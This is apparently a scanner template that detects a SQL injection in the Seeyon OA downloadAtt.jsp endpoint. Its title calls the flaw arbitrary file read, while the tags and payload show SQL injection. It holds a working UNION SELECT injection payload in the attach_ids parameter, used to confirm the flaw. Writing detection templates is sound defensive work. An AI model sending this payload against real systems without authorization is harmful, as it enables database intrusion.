id: seeyon-downloadatt-sqli

info:
  name: 致远OA downloadAtt.jsp 任意文件读取漏洞
  author: Rexus
  severity: high
  verified: true
  reference:
    - https://bugs.shuimugan.com/bug/view?bug_no=0108235
  description: |
    致远OA downloadAtt.jsp 任意文件读取漏洞
  tags: seeyon,wooyun,2015,0108235,sqli
  created: 2023/05/26
  requires: [seeyon]
  requires-mode: opportunistic

set:
  rand: randomInt(200000000, 210000000)
rules:
  r0:
    request:
      method: GET
      path: /yyoa/ext/trafaxserver/downloadAtt.jsp?attach_ids=(1)%20and%201=2%20union%20select%201,2,3,4,5,md5({{rand}}),7--
    expression: response.body.bcontains(bytes(md5(string(rand))))
expression: r0()
